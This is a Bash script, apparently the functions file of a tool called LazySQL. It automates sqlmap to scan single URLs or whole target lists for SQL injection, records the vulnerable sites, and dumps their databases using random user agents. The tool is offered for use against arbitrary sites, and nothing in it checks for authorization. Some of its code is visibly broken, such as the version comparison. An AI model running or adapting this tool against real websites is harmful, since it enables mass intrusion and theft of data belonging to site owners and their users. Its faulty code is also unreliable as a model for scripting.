#!/bin/bash
##Settings#
vn=2.2


function versioncheck () {
  gvn=$(curl -s https://raw.githubusercontent.com/Inbell1s/LazySQL/master/.functions | grep -Po "(?<=vn=)([0-9]|\.)*(?=\s|$)")
  if [[ $vn=<$gvn ]]; then
  logolsql
  echo
  tput bold;
  tput smso;
  echo "Update available!"
  echo
  echo "Updating.."
  tput sgr0;
  sleep 3
  update
else
  sleep 0
  fi
}


##Check requirements##
function require () {
  if command -v fsql >/dev/null 2>&1
   then
  sleep 0
  else
  echo "#!/bin/bash
  #Automated Sqlmap#
  lsql --fast" > /bin/fsql
  chmod +x /bin/fsql
  tput smso;
  echo "Added fsql command!"
  tput rmso;
  sleep 2
  fi



  if command -v unbuffer >/dev/null 2>&1
   then
  sleep 0
  else
  sudo apt-get install expect-dev
  fi


  if command -v tput >/dev/null 2>&1
   then
  sleep 0
  else
  sudo apt-get install ncurses-bin
  fi
}

##Logo##
function logolsql () {
  echo "  _                    ____   ___  _     ";
  echo " | |    __ _ _____   _/ ___| / _ \| |    ";
  echo " | |   / _\` |_  / | | \___ \| | | | |    ";
  echo " | |__| (_| |/ /| |_| |___) | |_| | |___ ";
  echo " |_____\__,_/___|\__, |____/ \__\_\_____|";
  echo "                 |___/                   ";
  echo "Version: $vn"
  echo
  echo "LazySQL script is used for fast sqlmap scanning and dumping."
  echo "If no URL is specified, LazySQL uses the last clipboard entry."
  echo "If the number of threads is not specified, LazySQL uses "3" as standard value."
  echo
  echo "Confirmed injections can be found in either: ~/.lsql.vul (including timestamp) and ~/lsql.list (plain)."
  echo
  echo "Usage:"
  echo
  echo "lsql [option]"
  echo "--fast Use clipboard url and scan it."
  echo "--list Display discovered injections."
  echo "--multi Start multi target scanning and dumping."
  echo "--resume Resume discovered injection url."
  echo
  echo "Or simply follow the menu."
  echo
  echo "Made for private use by Inbell1s."
  echo
}
##Menu##
function menu (){
  tput bold ;
  tput smso;
  echo "Options:"
  tput sgr0;

  PS3='
  What would you like to do?:'
  options=("Confirm injection." "MultiSQL" "Resume injection." "List" "Update" "Quit")
  select opt in "${options[@]}"
  do
      case $opt in
          "Confirm injection.")
          confirm
          ;;
          "MultiSQL")
          clear
          multi
          ;;
          "Resume injection.")
          resume
          ;;
          "List")
            list
          ;;
          "Update")
          update
          ;;
          "Quit")
          quit
          ;;
          *)  tput setaf 1;
              tput bold;
              echo "Please choose a valid option."
              tput sgr0;
  esac
  done
}

##Update##
function update () {
  rm -rf ~/.updatelsql
  git clone https://github.com/Inbell1s/LazySQL ~/.updatelsql
  cd ~/.updatelsql
  chmod +x install
  ./install
  rm -rf ~/.updatelsql
  exec bash lsql
}
##Checking Injection##
function confirm(){
input
confirmation
}

##Resume injection##
function resume (){
  re='^[0-9]+$'
grep -q -c "" ~/.lsql.vul > /.lsqlc
count=$(cat /.lsqlc)
tput smso;
echo "Confirmed Url's:"
tput rmso;
cat -n ~/.lsql.vul

tput smso;
echo "Injection Number:"
tput rmso;

read -r line
echo
while true; do
if ! [[ $line =~ $re ]] ; then
echo "Not a number!"
tput smso;
echo "Injection Number:"
tput rmso;
read -r line
else
break
fi
done
resumeurl=$(sed -n ""$line"p" ~/.lsql.vul | grep -o '^[^ ]\+')

tput smso;
echo "Resuming injection at:"
tput rmso;
echo $resumeurl
echo
echo "sqlmap --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u '"$resumeurl"'"
echo
echo
sleep 5
sqlmap --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u ""$resumeurl""
exit 0
}

##List injection##
function list (){
  echo
  tput smso;
  tput bold;
  echo "Confirmed Url's:"
   tput sgr0;
   cat -n ~/.lsql.vul
   echo
   menu
}

##Multiple target automatic##
function multi (){
  clear
  rm -f .msql.found
  echo
  echo "  __  __       _ _   _ ____   ___  _     ";
  echo " |  \/  |_   _| | |_(_) ___| / _ \| |    ";
  echo " | |\/| | | | | | __| \___ \| | | | |    ";
  echo " | |  | | |_| | | |_| |___) | |_| | |___ ";
  echo " |_|  |_|\__,_|_|\__|_|____/ \__\_\_____|";
  echo "                                         ";
  echo
  tput bold;
  tput smso;
  echo "Every line in the target file should start with the url!"
  echo
  echo "This script is part of LazySQL, for more information go to:"
  echo "https://github.com/Inbell1s/LazySQL"
  tput sgr0;
  echo
  echo "Path to target list:"
  read -r list
  echo
  while true; do
    if [ -e "$list" ]
    then
      grep -o '^[^ ]\+' $list > ".msql.target"
      echo
      tput setaf 2;
      echo "File found!"
      echo
      echo "Number of targets:"
      tput sgr0;
      cat ".msql.target" | wc -l
      sleep 3
      break
    else
      echo
      tput setaf 1;
      echo "File not found, please check your path!"
      tput sgr0;
      echo
      echo "Path to target list:"
      read -r list
    fi
  done
  echo
  tput bold;
  tput smul;
  tput setaf 1;
  echo "Now starting automatic scanning and dumping using '$list'."
  tput sgr0;
  sleep 3
  while IFS= read -r url; do
    unbuffer sqlmap --random-agent --smart --batch --output-dir=~/MultiSQL/Dump/ --threads 3 --dbs -u "$url" | tee lsql.log
    echo
    if  grep -q "back-end DBMS:" lsql.log; then
    now=$(date)
    	if grep -q "$url" ~/.lsql.vul; then
    	tput smso;
    	echo "Previously added url!"
    	else
        echo "$url - $now" >> ~/.lsql.vul
        echo "$url" >> ~/lsql.list
        echo "$url - $now" >> /.msql.found
    	echo "Added to log!"
    	tput rmso;
    fi
    tput smso;
    echo
    echo "Injection found."
    tput rmso;
    else
    echo
    echo "$url" >> /.lsql.no
    tput smso;
    echo "No injection found."
    tput rmso;
    fi

    if grep -q "$url" ~/.lsql.vul; then
    echo "$url" >> .msql.dump
    else
    sleep 0
    fi
  done < ".msql.target"
  echo
  tput smso;
  echo "All targets processed!"
  tput rmso;
  echo
  echo "Valid injections found:"
  echo
  cat -n .msql.dump
  sleep 5
  echo
  tput smso;
  echo "Starting database dumps in new window!"
  tput rmso;
  sleep 3
  while IFS= read -r url; do
  gnome-terminal --tab -- bash -c "sqlmap --random-agent -o --output-dir=~/MultiSQL/Dump/ --batch --no-cast --exclude-sysdb --dump-all --dump-format sqlite -u ""$url""" &>/dev/null
  done < ".msql.dump"
  rm -f .msql.dump
  exit 0
}

##Exit##
function quit (){
  echo
  echo "Closing LazySQL.."
  sleep 2
  exit 0
}

##Use clipboard url##
function fast (){
  url=$(xclip -selection c -o)
    Threads="3"
    extra=""

      while true; do
	       if echo $url | grep -q -v "http"; then
		         tput rmso;
		         tput smso;
		         echo "Url does not contain "http or https""
		         tput rmso;
		         echo -ne '\007'
		         echo
		         echo "Valid url:"
		         read -r url
			       if [ -z "$url" ]; then
               url=$(xclip -selection c -o)
		         fi
        else
		         echo
		         tput smso;
		         echo "Using url: $url"
		         tput rmso;
		         break
	      fi
      done
      confirmation
}

##Ask user input##
function input (){
  echo "URL:"
read -r url
	if [ -z "$url" ]; then
		url=$(xclip -selection c -o)
	fi

while true; do
	if echo $url | grep -q -v "http"; then
		tput rmso;
		tput smso;
		echo "Url does not contain "http or https""
		tput rmso;
		echo -ne '\007'
		echo
		echo "Valid url:"
		read -r url
			if [ -z "$url" ]; then
                		url=$(xclip -selection c -o)
		        fi
             elif echo $url | grep -q $url /.lsql.no; then
		tput smso;
		echo "Previous scan detected uninjectable url."
		tput rmso;
		echo -ne '\007'
		sleep 2
		exit 0
	else
		echo
		tput smso;
		echo "Using url: $url"
		tput rmso;
		break
	fi
done

echo
echo "Threads:"
read -r Threads
	if [ -z "$Threads" ]; then
		Threads=3
		tput smso;
  echo "Starting with 3 Threads."
tput rmso;

	fi

echo "Extra"
read -r extra
}

##Scan url##
function confirmation (){
  unbuffer sqlmap --random-agent --batch --output-dir=~/MultiSQL/Dump/ --threads "$Threads" --dbs -u "$url" $extra | tee lsql.log

  echo
  echo
  tput smso;
  echo "Used command:"
  tput rmso;
  echo "sqlmap --random-agent --batch --output-dir=~/MultiSQL/Dump/ --threads '"$Threads"' --dbs -u '"$url"' "$extra""
  echo
  echo "Link:"
  echo $url
  echo
  if  grep -q "back-end DBMS:" lsql.log; then
  now=$(date)
   if grep -q "$url" ~/.lsql.vul; then
   tput smso;
   echo "Previously added url!"
   else
      echo "$url - $now" >> ~/.lsql.vul
      echo "$url" >> ~/lsql.list
   echo "Added to log!"
   tput rmso;
  fi
  tput smso;
  echo
  echo
  echo "Injection found, next command:"
  tput rmso;
  echo "sqlmap --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u '"$url"'"
  echo
  echo
  sqlmap --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u ""$url""
  else
  echo
  echo "$url" >> /.lsql.no
  tput smso;
  echo "No injection found."
  tput rmso;
  exit 0
  fi
}

##Commandline arguments##
function commandargs (){
  if [ "$1" == --fast ]; then
    fast
  elif [ "$1" == --list ]; then
    list
  elif [ "$1" == --multi ]; then
    multi
  elif [ "$1" == --resume ]; then
    resume
  else
    menu
  fi
}
